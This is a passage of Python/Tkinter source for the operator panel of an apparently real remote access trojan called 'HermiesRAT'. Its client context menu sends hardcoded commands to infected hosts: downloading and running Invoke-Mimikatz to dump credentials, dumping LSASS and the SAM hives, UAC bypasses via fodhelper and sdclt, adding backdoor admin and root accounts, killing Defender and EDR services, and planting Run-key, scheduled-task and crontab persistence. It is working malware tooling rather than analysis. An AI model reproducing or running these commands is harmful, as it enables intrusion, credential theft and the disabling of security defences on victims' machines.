        self.update_idletasks()
        w = max(self._content_area.winfo_width(),  1200)
        h = max(self._content_area.winfo_height(), 760)
        try:
            img  = Image.open(STARS_PATH)
            tw, th = img.size
            tiled = Image.new("RGBA" if img.mode == "RGBA" else "RGB", (w, h))
            for y in range(0, h, th):
                for x in range(0, w, tw):
                    tiled.paste(img, (x, y))
            self._stars_photo = ImageTk.PhotoImage(tiled)
            if self._stars_label is None:
                self._stars_label = tk.Label(self._content_area,
                                             image=self._stars_photo,
                                             bd=0, highlightthickness=0)
            else:
                self._stars_label.configure(image=self._stars_photo)
            self._stars_label.place(x=0, y=0, relwidth=1, relheight=1)
            self._stars_label.lower()
        except Exception as e:
            self.log(f"[theme] stars error: {e}")

    def _build(self):
        self._build_header()
        self._build_nav()
        self._build_content()

    def _build_header(self):
        T = THEME
        self._hdr = tk.Frame(self, bg=T["NAV_BG"], height=48)
        self._hdr.pack(fill=tk.X)
        self._hdr.pack_propagate(False)
        tk.Label(self._hdr, text="HermiesRAT-Bata-1.aw", bg=T["NAV_BG"], fg=T["FG"],
                 font=("Segoe UI", 13, "bold")).pack(side=tk.LEFT, padx=14, pady=4)
        self._status_lbl = tk.Label(self._hdr, text="● stopped",
                                    bg=T["NAV_BG"], fg=T["FG_DIM"],
                                    font=("Segoe UI", 9, "bold"))
        self._status_lbl.pack(side=tk.RIGHT, padx=14)
        self._listen_lbl = tk.Label(self._hdr, text="",
                                    bg=T["NAV_BG"], fg=T["FG_DIM"],
                                    font=("Segoe UI", 9))
        self._listen_lbl.pack(side=tk.RIGHT, padx=(0, 4))

    def _build_nav(self):
        T = THEME
        self._nav = tk.Frame(self, bg=T["NAV_BG"], height=42)
        self._nav.pack(fill=tk.X)
        self._nav.pack_propagate(False)
        self._nav_buttons = {}
        tabs = ["Clients", "Datalogs", "Logs", "Screen", "Camera",
                "Task", "PayloadCenter", "Files", "builder", "Shell", "Mic", "Map", "Settings", "Customize"]
        for tab in tabs:
            btn = tk.Button(
                self._nav, text=tab,
                bg=T["NAV_BG"], fg=T["FG"],
                activebackground=T["BG3"], activeforeground=T["ACCENT"],
                font=("Segoe UI", 9, "bold"),
                relief="flat", bd=0, padx=10, pady=6,
                cursor="hand2",
                command=lambda tb=tab: self._switch_tab(tb))
            btn.pack(side=tk.LEFT, fill=tk.Y)
            self._nav_buttons[tab] = btn
        tk.Frame(self, bg=T["ACCENT"], height=2).pack(fill=tk.X)

    def _build_content(self):
        T = THEME
        self._content_frames = {}
        self._active_tab     = None
        self._content_area   = tk.Frame(self, bg=T["BG"])
        self._content_area.pack(fill=tk.BOTH, expand=True)

        self._build_clients_tab()
        self._build_datalogs_tab()
        self._build_logs_tab()
        self._build_screen_tab()
        self._build_camera_tab()
        self._build_task_tab()
        self._build_payload_center_tab()
        self._build_files_tab()
        self._build_builder_tab()
        self._build_shell_tab()
        self._build_mic_tab()
        self._build_map_tab()
        self._build_settings_tab()
        self._build_custom_tab()

        self._switch_tab("Clients")
        self.after(100, self._apply_stars)

    def _switch_tab(self, name):
        T = THEME
        for f in self._content_frames.values():
            f.place_forget()
        if name in self._content_frames:
            self._content_frames[name].place(relx=0, rely=0, relwidth=1, relheight=1)
        if self._stars_label and THEME.get("STARS_BG"):
            self._stars_label.lower()
        for tname, btn in self._nav_buttons.items():
            if tname == name:
                btn.configure(bg=T["BG3"], fg=T["ACCENT"],
                              font=("Segoe UI", 9, "bold", "underline"))
            else:
                btn.configure(bg=T["NAV_BG"], fg=T["FG"],
                              font=("Segoe UI", 9, "bold"))
        self._active_tab = name
        if name == "Mic":
            self._mic_refresh_target()
        if name == "Task":
            self._task_refresh_target()
        if name == "PayloadCenter":
            self._pc_refresh_target()
            self._pc_refresh_list()
        if name == "Files":
            self._fb_refresh_target()
            if (self.selected_cid is not None
                    and not self._ssshare_running
                    and not self._cam_streaming):
                self._fb_navigate(self._fb_path_var.get())
        if name == "Scripts":
            self._scr_refresh_target()
        if name == "Settings":
            self._settings_refresh_db()

    def _make_frame(self, name):
        f = tk.Frame(self._content_area, bg=THEME["BG"])
        self._content_frames[name] = f
        return f

    #  clients tab

    def _build_clients_tab(self):
        T = THEME
        f = self._make_frame("Clients")
        hdr = tk.Frame(f, bg=T["BG"])
        hdr.pack(fill=tk.X, padx=10, pady=(12, 0))
        for i, col in enumerate(["USER", "OS", "IP"]):
            tk.Label(hdr, text=col, bg=T["BG"], fg=T["ACCENT"],
                     font=("Segoe UI", 9, "bold")).grid(row=0, column=i, sticky="ew", padx=1)
            hdr.columnconfigure(i, weight=1)
        self._client_grid_frame = tk.Frame(f, bg=T["BG"])
        self._client_grid_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=4)
        for i in range(3):
            self._client_grid_frame.columnconfigure(i, weight=1)
        self._client_cell_widgets = []
        for row in range(self._PAGE_SIZE):
            row_cells = []
            for col in range(3):
                cell = tk.Frame(self._client_grid_frame,
                                bg=T["CELL_BG"],
                                highlightbackground=T["GRID_BDR"],
                                highlightthickness=1, height=24)
                cell.grid(row=row, column=col, sticky="nsew", padx=1, pady=1)
                cell.grid_propagate(False)
                lbl = tk.Label(cell, text="", bg=T["CELL_BG"], fg=T["FG"],
                               font=FONT, anchor="w")
                lbl.pack(fill=tk.BOTH, expand=True, padx=6)
                row_cells.append((cell, lbl))
            self._client_grid_frame.rowconfigure(row, weight=1)
            self._client_cell_widgets.append(row_cells)
        bar = tk.Frame(f, bg=T["BG"])
        bar.pack(fill=tk.X, padx=10, pady=(0, 10))
        self._page_btn = tk.Button(
            bar, text=f"Page 1-{self._PAGE_SIZE} ->",
            bg=T["ACCENT"], fg=T["HDR_FG"], font=("Segoe UI", 9, "bold"),
            relief="flat", padx=10, pady=4, cursor="hand2",
            command=self._next_page)
        self._page_btn.pack(side=tk.LEFT)
        tk.Button(bar, text="disconnect",
                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
                  command=self._disconnect, cursor="hand2").pack(side=tk.RIGHT)
        self._refresh_client_grid()

    def _refresh_client_grid(self):
        T = THEME
        with _lock:
            items = list(clients.items())
        start      = self._page * self._PAGE_SIZE
        page_items = items[start:start + self._PAGE_SIZE]
        for row_idx in range(self._PAGE_SIZE):
            if row_idx < len(page_items):
                cid, info = page_items[row_idx]
                addr = info.get("label", "")
                vals = [info.get("user", addr), info.get("os", ""),
                        addr.split(":")[0] if ":" in addr else addr]
            else:
                cid, vals = None, ["", "", ""]
            for col_idx, (cell, lbl) in enumerate(self._client_cell_widgets[row_idx]):
                lbl.configure(text=vals[col_idx])
                if cid is not None:
                    if cid == self.selected_cid:
                        cell.configure(highlightbackground=T["ACCENT"], highlightthickness=2)
                        lbl.configure(bg=T["BG3"], fg=T["ACCENT"])
                    else:
                        cell.configure(highlightbackground=T["GRID_BDR"], highlightthickness=1)
                        lbl.configure(bg=T["CELL_BG"], fg=T["FG"])
                    def _sel(e, c=cid):
                        self.selected_cid = c
                        self._refresh_client_grid()
                        self.log(f"selected target {c}")
                    def _rc(e, c=cid):
                        self._show_ctx_menu(e, c)
                    cell.bind("<Button-1>", _sel);  lbl.bind("<Button-1>", _sel)
                    cell.bind("<Button-3>", _rc);   lbl.bind("<Button-3>", _rc)
                else:
                    cell.configure(highlightbackground=T["GRID_BDR"], highlightthickness=1)
                    lbl.configure(bg=T["CELL_BG"], fg=T["FG"])
        total = len(items)
        s = self._page * self._PAGE_SIZE + 1
        e = min(s + self._PAGE_SIZE - 1, max(total, 1))
        self._page_btn.configure(text=f"Page {s}-{e} ->")

    def _next_page(self):
        with _lock: total = len(clients)
        max_page = max(0, (total - 1) // self._PAGE_SIZE)
        self._page = (self._page + 1) % (max_page + 1)
        self._refresh_client_grid()

    def refresh_clients(self):
        self.after(0, self._refresh_client_grid)

    #  context menu 

    def _show_ctx_menu(self, event, cid):
        T = THEME
        self.selected_cid = cid
        self._refresh_client_grid()
        mk = dict(bg=T["BG2"], fg=T["FG"], activebackground=T["ACCENT"],
                  activeforeground=T["HDR_FG"], font=("Segoe UI", 11),
                  relief="flat", bd=0, tearoff=0)
        menu = tk.Menu(self, **mk)
        info  = clients.get(cid, {})
        label = info.get("label", f"client {cid}")
        menu.add_command(label=f"  ◉  {label}", state="disabled",
                         font=("Segoe UI", 9, "bold"))
        menu.add_separator()
        menu.add_command(label="  ✔  Select",
                         command=lambda: (setattr(self, "selected_cid", cid),
                                         self._refresh_client_grid()))
        recon = tk.Menu(menu, **mk)
        menu.add_cascade(label="  🔍  Recon  ▶", menu=recon)
        recon.add_command(label="  Screenshot",   command=self._screenshot)
        recon.add_command(label="  Whoami / ID",
            command=lambda: self._ctx_inject(cid, "powershell", "whoami /all"))
        recon.add_command(label="  Sys Info",
            command=lambda: self._ctx_inject(cid, "powershell",
                "Get-ComputerInfo | Select-Object CsName,OsName,OsVersion,"
                "OsArchitecture,CsProcessors,CsTotalPhysicalMemory"))
        recon.add_command(label="  Env Dump",
            command=lambda: self._ctx_inject(cid, "powershell",
                "Get-ChildItem Env: | Format-Table -AutoSize"))
        recon.add_command(label="  Network Interfaces",
            command=lambda: self._ctx_inject(cid, "powershell",
                "Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,AddressFamily"))
        recon.add_command(label="  ARP / Hosts",
            command=lambda: self._ctx_inject(cid, "cmd",
                "arp -a & type %SystemRoot%\\System32\\drivers\\etc\\hosts"))
        recon.add_command(label="  Logged-in Users",
            command=lambda: self._ctx_inject(cid, "cmd", "query user"))
        recon.add_command(label="  Clipboard",
            command=lambda: self._ctx_inject(cid, "powershell", "Get-Clipboard"))
        recon.add_separator()
        recon.add_command(label="  [L] id / uname / hostname",
            command=lambda: self._ctx_inject(cid, "bash",
                "id && uname -a && hostname && cat /etc/os-release 2>/dev/null"))
        recon.add_command(label="  [L] network (ip a / ss)",
            command=lambda: self._ctx_inject(cid, "bash",
                "ip a 2>/dev/null; ss -tulpn 2>/dev/null"))
        recon.add_command(label="  [L] processes",
            command=lambda: self._ctx_inject(cid, "bash", "ps aux --sort=-%cpu | head -30"))
        recon.add_command(label="  [L] /etc/passwd + shadow",
            command=lambda: self._ctx_inject(cid, "bash",
                "cat /etc/passwd; echo ---; sudo cat /etc/shadow 2>/dev/null"))
        recon.add_command(label="  [L] crontabs",
            command=lambda: self._ctx_inject(cid, "bash",
                "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls /etc/cron* 2>/dev/null"))
        recon.add_command(label="  [L] env",
            command=lambda: self._ctx_inject(cid, "bash", "env"))
        recon.add_command(label="  [L] geo (curl ipinfo)",
            command=lambda: self._ctx_inject(cid, "bash",
                "curl -s --max-time 5 https://ipinfo.io/json 2>/dev/null"))
        sh = tk.Menu(menu, **mk)
        menu.add_cascade(label="  🖥  Shell  ▶", menu=sh)
        sh.add_command(label="  PowerShell",
                       command=lambda: self._quick_shell(cid, "powershell"))
        sh.add_command(label="  CMD",
                       command=lambda: self._quick_shell(cid, "cmd"))
        sh.add_command(label="  Bash",
                       command=lambda: self._quick_shell(cid, "bash"))
        sh.add_separator()
        sh.add_command(label="  Task Tab  →",
                       command=lambda: (setattr(self, "selected_cid", cid),
                                        self._switch_tab("Task")))
        priv = tk.Menu(menu, **mk)
        menu.add_cascade(label="  ⚡  Privesc / UAC  ▶", menu=priv)
        priv.add_command(label="  Inject Mimikatz",
            command=lambda: self._ctx_inject(cid, "powershell",
                "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/"
                "BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/"
                "Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"))
        priv.add_command(label="  Dump LSASS",
            command=lambda: self._ctx_inject(cid, "powershell",
                "$p=(Get-Process lsass).Id; rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
                "MiniDump $p C:\\Windows\\Temp\\lsass.dmp full"))
        priv.add_command(label="  UAC Bypass fodhelper",
            command=lambda: self._ctx_inject(cid, "powershell",
                "New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command "
                "-Value 'cmd.exe /c start cmd.exe' -Force; "
                "New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command "
                "-Name DelegateExecute -Value '' -Force; "
                "Start-Process fodhelper.exe -WindowStyle Hidden"))
        priv.add_command(label="  UAC Bypass sdclt",
            command=lambda: self._ctx_inject(cid, "powershell",
                "New-Item -Path 'HKCU:\\Software\\Classes\\exefile\\shell\\runas\\command' "
                "-Value 'cmd.exe /c start cmd.exe' -Force; "
                "Start-Process sdclt.exe -WindowStyle Hidden"))
        priv.add_command(label="  Disable UAC",
            command=lambda: self._ctx_inject(cid, "powershell",
                "Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\"
                "Policies\\System -Name EnableLUA -Value 0 -Force"))
        priv.add_command(label="  Add Admin User",
            command=lambda: self._ctx_inject(cid, "cmd",
                "net user hermies H3rm!esR@T /add & net localgroup administrators hermies /add"))
        priv.add_separator()
        priv.add_command(label="  [L] sudo -l",
            command=lambda: self._ctx_inject(cid, "bash", "sudo -l 2>&1"))
        priv.add_command(label="  [L] SUID find",
            command=lambda: self._ctx_inject(cid, "bash",
                "find / -perm -4000 -type f 2>/dev/null | head -30"))
        priv.add_command(label="  [L] capabilities",
            command=lambda: self._ctx_inject(cid, "bash", "getcap -r / 2>/dev/null"))
        priv.add_command(label="  [L] writable crons/svcs",
            command=lambda: self._ctx_inject(cid, "bash",
                "find /etc/cron* /etc/systemd /lib/systemd -writable -type f 2>/dev/null"))
        priv.add_command(label="  [L] crontab persist",
            command=lambda: self._ctx_inject(cid, "bash",
                "(crontab -l 2>/dev/null; echo '@reboot /tmp/.hermies &') | crontab -"))
        priv.add_command(label="  [L] add root user",
            command=lambda: self._ctx_inject(cid, "bash",
                "echo 'hermies:$6$rounds=4096$saltsalt$HASH:0:0:root:/root:/bin/bash' "
                "| sudo tee -a /etc/passwd 2>/dev/null"))
        proc = tk.Menu(menu, **mk)
        menu.add_cascade(label="  ⚙  Process  ▶", menu=proc)
        proc.add_command(label="  List (top CPU)",
            command=lambda: self._ctx_inject(cid, "powershell",
                "Get-Process | Sort-Object CPU -Desc | Select -First 30 | Format-Table Name,Id,CPU,WS -Auto"))
        proc.add_command(label="  Kill by Name…",
                         command=lambda: self._ctx_kill_dialog(cid))
        proc.add_command(label="  Kill Defender",
            command=lambda: self._ctx_inject(cid, "powershell",
                "Stop-Process -Name MsMpEng -Force -EA SilentlyContinue"))
        proc.add_command(label="  Kill EDR batch",
            command=lambda: self._ctx_inject(cid, "powershell",
                "$edr='MsMpEng','SenseCncProxy','MsSense','AATPSensor',"
                "'CylanceSvc','cb','AmSvc','MBAMService','bdservicehost';"
                "$edr|%{Stop-Process -Name $_ -Force -EA SilentlyContinue;"
                "sc.exe stop $_;sc.exe config $_ start= disabled}"))
        reg = tk.Menu(menu, **mk)
        menu.add_cascade(label="  🗄  Registry  ▶", menu=reg)
        reg.add_command(label="  List Run keys",
            command=lambda: self._ctx_inject(cid, "powershell",
                "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,"
                "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run | Format-List"))
        reg.add_command(label="  Add Persistence HKCU Run",
            command=lambda: self._ctx_inject(cid, "powershell",
                "Set-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run "
                "-Name 'WindowsUpdate' -Value 'C:\\Windows\\Temp\\hermies.exe'"))
        reg.add_command(label="  Remove Persistence",
            command=lambda: self._ctx_inject(cid, "powershell",
                "Remove-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run "
                "-Name 'WindowsUpdate' -EA SilentlyContinue"))
        reg.add_command(label="  Dump SAM hives",
            command=lambda: self._ctx_inject(cid, "cmd",
                "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y & "
                "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive /y"))
        reg.add_command(label="  Scheduled Task persist",
            command=lambda: self._ctx_inject(cid, "powershell",
                "schtasks /create /sc onlogon /tn 'WindowsUpdate' "
                "/tr 'C:\\Windows\\Temp\\hermies.exe' /ru SYSTEM /f"))
        troll = tk.Menu(menu, **mk)
        menu.add_cascade(label="  🃏  Troll  ▶", menu=troll)
        for category, payloads in TROLL_PAYLOADS.items():
            cat_menu = tk.Menu(troll, **mk)
            troll.add_cascade(label=f"   {category}  ▶", menu=cat_menu)
            for lbl, shell, cmd in payloads:
                cat_menu.add_command(
                    label=f"   {lbl}",
                    command=lambda s=shell, c=cmd: self._ctx_inject(cid, s, c))
        troll.add_separator()
        troll.add_command(label="   🗨  Messagebox builder",
                          command=lambda: self._troll_msgbox_dialog(cid))
        menu.add_separator()
        menu.add_command(label="  ✖  Disconnect",
                         command=self._disconnect,
                         foreground=T["RED"], activeforeground=T["RED"])
        try:
            menu.tk_popup(event.x_root, event.y_root)
        finally:
            menu.grab_release()

    def _ctx_inject(self, cid, shell, cmd):
        self.selected_cid = cid
        self.log(f"[ctx/{shell}] {cmd[:80]}")
        threading.Thread(target=self._quick_shell_worker,
                         args=(clients[cid]["sock"], shell, cmd), daemon=True).start()

    def _troll_msgbox_dialog(self, cid=None):
        T = THEME
        dlg = tk.Toplevel(self)
        dlg.title("Messagebox Troll")
        dlg.configure(bg=T["BG2"])
        dlg.resizable(True, False)
        dlg.geometry("500x260")
        dlg.grab_set()

        # title row
        tr = tk.Frame(dlg, bg=T["BG2"], height=32)
        tr.pack(fill=tk.X); tr.pack_propagate(False)
        tk.Label(tr, text="Window Title:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(side=tk.LEFT, padx=(12, 6), pady=6)
        title_var = tk.StringVar(value="WARNING")
        tk.Entry(tr, textvariable=title_var, bg=T["BG3"], fg=T["FG"],
                 insertbackground=T["ACCENT"], font=FONT_MON, relief="flat",
                 highlightbackground=T["BG4"], highlightthickness=1, width=28
                 ).pack(side=tk.LEFT, fill=tk.X, expand=True, pady=6, padx=(0, 12))

        # icon row
        ir = tk.Frame(dlg, bg=T["BG2"], height=28)
        ir.pack(fill=tk.X); ir.pack_propagate(False)
        tk.Label(ir, text="Icon:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(side=tk.LEFT, padx=(12, 6), pady=4)
        icon_var = tk.StringVar(value="Error")
        for ico in ("Error", "Warning", "Information", "Question"):
            tk.Radiobutton(ir, text=ico, variable=icon_var, value=ico,
                           bg=T["BG2"], fg=T["FG"], selectcolor=T["BG3"],
                           activebackground=T["BG2"], activeforeground=T["ACCENT"],
                           font=FONT, bd=0, highlightthickness=0, indicatoron=0,
                           padx=8, pady=2, relief="flat", cursor="hand2"
                           ).pack(side=tk.LEFT, padx=2)

        tk.Frame(dlg, bg=T["BG4"], height=1).pack(fill=tk.X, padx=10, pady=(4, 0))

        # message body
        tk.Label(dlg, text="Message:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(anchor="w", padx=12, pady=(6, 2))
        body_txt = tk.Text(dlg, bg=T["BG3"], fg=T["FG"], font=FONT_MON, height=4,
                           insertbackground=T["ACCENT"], selectbackground=T["BG4"],
                           selectforeground=T["ACCENT"], relief="flat", borderwidth=0,
                           highlightbackground=T["BG4"], highlightthickness=1,
                           wrap=tk.WORD, undo=True)
        body_txt.pack(fill=tk.X, padx=10, pady=(0, 6))
        body_txt.insert("1.0", "Your computer has been hacked!")
        body_txt.focus_set()

        # buttons
        btn_row = tk.Frame(dlg, bg=T["BG2"], height=42)
        btn_row.pack(fill=tk.X); btn_row.pack_propagate(False)

        def _build_ps():
            msg   = body_txt.get("1.0", tk.END).strip().replace("'", "''")
            title = title_var.get().strip().replace("'", "''") or "Alert"
            ico   = icon_var.get()
            return (
                "powershell",
                f"Add-Type -AssemblyName System.Windows.Forms;"
                f"[System.Windows.Forms.MessageBox]::Show("
                f"'{msg}','{title}',"
                f"[System.Windows.Forms.MessageBoxButtons]::OK,"
                f"[System.Windows.Forms.MessageBoxIcon]::{ico})"
            )

        def _load():
            shell, cmd = _build_ps()
            self._task_load_payload(shell, cmd)
            self._switch_tab("Task")
            dlg.destroy()

        def _run():
            if self.selected_cid is None:
                self.log("[msgbox] no target selected")
                return
            shell, cmd = _build_ps()
            self.log(f"[troll] msgbox -> id={self.selected_cid}")
            threading.Thread(target=self._quick_shell_worker,
                             args=(clients[self.selected_cid]["sock"], shell, cmd),
                             daemon=True).start()
            dlg.destroy()

        def _on_ctrl_enter(event):
            _run()

        body_txt.bind("<Control-Return>", _on_ctrl_enter)

        tk.Button(btn_row, text="load to Task",
                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
                  padx=12, pady=6, cursor="hand2",
                  command=_load).pack(side=tk.LEFT, padx=(12, 4), pady=6)
        tk.Button(btn_row, text="run on target  (Ctrl+Enter)",
                  bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat",
                  padx=12, pady=6, cursor="hand2",
                  command=_run).pack(side=tk.LEFT, padx=(0, 4), pady=6)
        tk.Button(btn_row, text="cancel",
                  bg=T["BG3"], fg=T["FG_DIM"], font=("Segoe UI", 8), relief="flat",
                  padx=8, cursor="hand2",
                  command=dlg.destroy).pack(side=tk.RIGHT, padx=12, pady=6)

    def _ctx_kill_dialog(self, cid):
        T = THEME
        dlg = tk.Toplevel(self); dlg.title(f"Kill client {cid}")
        dlg.configure(bg=T["BG2"]); dlg.resizable(False, False)
        dlg.geometry("400x90"); dlg.grab_set()
        tk.Label(dlg, text="Process name:", bg=T["BG2"], fg=T["ACCENT"],
                 font=FONT).pack(side=tk.LEFT, padx=(14, 6), pady=28)
        var = tk.StringVar()
        e = ttk.Entry(dlg, textvariable=var, font=FONT_MON, width=28)
        e.pack(side=tk.LEFT, fill=tk.X, expand=True, pady=28); e.focus_set()
        def _fire():
            n = var.get().strip()
            if not n: dlg.destroy(); return
            dlg.destroy()
            self._ctx_inject(cid, "powershell",
                             f"Stop-Process -Name '{n}' -Force -EA SilentlyContinue;"
                             f"taskkill /IM '{n}' /F 2>&1")
        e.bind("<Return>", lambda ev: _fire())
        tk.Button(dlg, text="kill", bg=T["RED"], fg="white",
                  font=("Segoe UI", 10, "bold"), relief="flat",
                  padx=10, command=_fire).pack(side=tk.LEFT, padx=8)

    def _quick_shell(self, cid, shell_type):
        T = THEME
        dlg = tk.Toplevel(self)
        dlg.title(f"Quick Shell [{shell_type}] client {cid}")
        dlg.configure(bg=T["BG2"]); dlg.resizable(True, False)
        dlg.geometry("560x110"); dlg.grab_set()
        tk.Label(dlg, text=f"{shell_type} >", bg=T["BG2"], fg=T["ACCENT"],
                 font=FONT_MON).pack(side=tk.LEFT, padx=(12, 4), pady=20)
        var = tk.StringVar()
        entry = ttk.Entry(dlg, textvariable=var, font=FONT_MON, width=52)
        entry.pack(side=tk.LEFT, fill=tk.X, expand=True, pady=20); entry.focus_set()
        def _fire():
            cmd = var.get().strip()
            if not cmd: dlg.destroy(); return
            dlg.destroy()
            self.log(f"[quick/{shell_type}] {cmd}")
            threading.Thread(target=self._quick_shell_worker,
                             args=(clients[cid]["sock"], shell_type, cmd), daemon=True).start()
        entry.bind("<Return>", lambda e: _fire())
        tk.Button(dlg, text="run", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat",
                  padx=10, command=_fire).pack(side=tk.LEFT, padx=8, pady=20)

    def _quick_shell_worker(self, sock, shell_type, cmd):
        tx_b = rx_b = 0
        try:
            payload = json.dumps({"cmd": "shell",
                                  "data": {"shell": shell_type, "cmd": cmd}}).encode()
            tx_b = len(payload) + 4
            send_msg(sock, "shell", {"shell": shell_type, "cmd": cmd})
            resp = recv_msg(sock)
            if resp: rx_b = len(json.dumps(resp).encode()) + 4
            out = resp["data"] if resp else "<no response>"
        except Exception as e:
            out = f"<error: {e}>"
        ts   = time.strftime("%H:%M:%S")
        line = f"[{ts}][{shell_type}] {cmd}\n{out}\n{''*60}\n"
        self._append(self._task_out_widget, line)
        if hasattr(self, "_shell_out_right"):
            self._append(self._shell_out_right, line)
        self.log(f"[quick/{shell_type}] done")
        if self.selected_cid is not None:
            self._dl_record(self.selected_cid, tx_b, rx_b,
                            f"quick-shell/{shell_type}: {cmd[:60]}")

    #  datalogs tab 

    def _build_datalogs_tab(self):
        T = THEME
        f = self._make_frame("Datalogs")
        summary = tk.Frame(f, bg=T["BG2"], height=34)
        summary.pack(fill=tk.X); summary.pack_propagate(False)
        tk.Label(summary, text="TRAFFIC", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=(14, 10), pady=6)
        self._dl_total_tx = tk.Label(summary, text="↑ TX  0.00 KB",
                                     bg=T["BG2"], fg=T["GREEN"], font=FONT_SML)
        self._dl_total_tx.pack(side=tk.LEFT, padx=(0, 16), pady=6)
        self._dl_total_rx = tk.Label(summary, text="↓ RX  0.00 KB",
                                     bg=T["BG2"], fg=T["ACCENT2"], font=FONT_SML)
        self._dl_total_rx.pack(side=tk.LEFT, padx=(0, 16), pady=6)
        self._dl_total_both = tk.Label(summary, text="⇅ TOTAL  0.00 KB",
                                       bg=T["BG2"], fg=T["FG_DIM"], font=FONT_SML)
        self._dl_total_both.pack(side=tk.LEFT, pady=6)
        pane = tk.PanedWindow(f, orient=tk.HORIZONTAL, bg=T["BG"],
                              sashwidth=4, sashrelief="flat")
        pane.pack(fill=tk.BOTH, expand=True)
        left = tk.Frame(pane, bg=T["BG2"])
        pane.add(left, minsize=240, width=300)
        tk.Label(left, text="PER CLIENT", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(anchor="w", padx=10, pady=(10, 4))
        tk.Frame(left, bg=T["BG4"], height=1).pack(fill=tk.X, padx=10, pady=2)
        hdr_row = tk.Frame(left, bg=T["BG3"])
        hdr_row.pack(fill=tk.X, padx=10, pady=(2, 0))
        for col, w in [("ID/IP", 10), ("↑ TX KB", 8), ("↓ RX KB", 8)]:
            tk.Label(hdr_row, text=col, bg=T["BG3"], fg=T["ACCENT"],
                     font=("Consolas", 8, "bold"), width=w, anchor="w"
                     ).pack(side=tk.LEFT, padx=2, pady=2)
        self._dl_client_frame = tk.Frame(left, bg=T["BG2"])
        self._dl_client_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=4)
        right = tk.Frame(pane, bg=T["BG"],
                         highlightbackground=T["ACCENT"], highlightthickness=1)
        pane.add(right, minsize=300)
        log_hdr = tk.Frame(right, bg=T["BG2"], height=28)
        log_hdr.pack(fill=tk.X); log_hdr.pack_propagate(False)
        tk.Label(log_hdr, text="Event Log", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=10, pady=4)
        tk.Button(log_hdr, text="clear", bg=T["BG2"], fg=T["FG_DIM"],
                  font=("Segoe UI", 8), relief="flat", cursor="hand2",
                  command=lambda: self._clear_text(self._datalogs_widget)
                  ).pack(side=tk.RIGHT, padx=8, pady=2)
        self._datalogs_widget = scrolledtext.ScrolledText(
            right, bg=T["BG"], fg=T["FG"], font=FONT_SML,
            state="disabled", wrap=tk.WORD, relief="flat", borderwidth=0)
        self._datalogs_widget.pack(fill=tk.BOTH, expand=True)

    def _dl_record(self, cid, tx_bytes, rx_bytes, event_line=""):
        T = THEME
        self._traffic_totals["tx"] += tx_bytes
        self._traffic_totals["rx"] += rx_bytes
        if cid not in self._traffic_per_cid:
            self._traffic_per_cid[cid] = {"tx": 0, "rx": 0}
        self._traffic_per_cid[cid]["tx"] += tx_bytes
        self._traffic_per_cid[cid]["rx"] += rx_bytes
        def _update():
            tot_tx = self._traffic_totals["tx"] / 1024
            tot_rx = self._traffic_totals["rx"] / 1024
            self._dl_total_tx.configure(text=f"↑ TX  {tot_tx:.2f} KB")
            self._dl_total_rx.configure(text=f"↓ RX  {tot_rx:.2f} KB")
            self._dl_total_both.configure(text=f"⇅ TOTAL  {(tot_tx + tot_rx):.2f} KB")
            ctx = self._traffic_per_cid[cid]
            ip_label = clients.get(cid, {}).get("label", f"id={cid}")
            if cid not in self._dl_client_rows:
                row_f = tk.Frame(self._dl_client_frame, bg=T["BG2"])
                row_f.pack(fill=tk.X, pady=1)
                lbl_id = tk.Label(row_f, text=ip_label, bg=T["BG2"], fg=T["FG"],
                                  font=("Consolas", 8), width=10, anchor="w")
                lbl_id.pack(side=tk.LEFT, padx=2)
                lbl_tx = tk.Label(row_f, text=f"{ctx['tx'] / 1024:.2f}", bg=T["BG2"],
                                  fg=T["GREEN"], font=("Consolas", 8), width=8, anchor="w")
                lbl_tx.pack(side=tk.LEFT, padx=2)
                lbl_rx = tk.Label(row_f, text=f"{ctx['rx'] / 1024:.2f}", bg=T["BG2"],
                                  fg=T["ACCENT2"], font=("Consolas", 8), width=8, anchor="w")
                lbl_rx.pack(side=tk.LEFT, padx=2)
                self._dl_client_rows[cid] = {"row": row_f, "id": lbl_id,
                                             "tx": lbl_tx, "rx": lbl_rx}
            else:
                r = self._dl_client_rows[cid]
                r["id"].configure(text=ip_label)
                r["tx"].configure(text=f"{ctx['tx'] / 1024:.2f}")
                r["rx"].configure(text=f"{ctx['rx'] / 1024:.2f}")
            if event_line:
                self._append(self._datalogs_widget,
                             f"[{time.strftime('%H:%M:%S')}] [id={cid}] "
                             f"↑{tx_bytes / 1024:.2f}KB ↓{rx_bytes / 1024:.2f}KB  {event_line}\n")
        self.after(0, _update)

    #  logs tab 

    def _build_logs_tab(self):
        T = THEME
        f = self._make_frame("Logs")
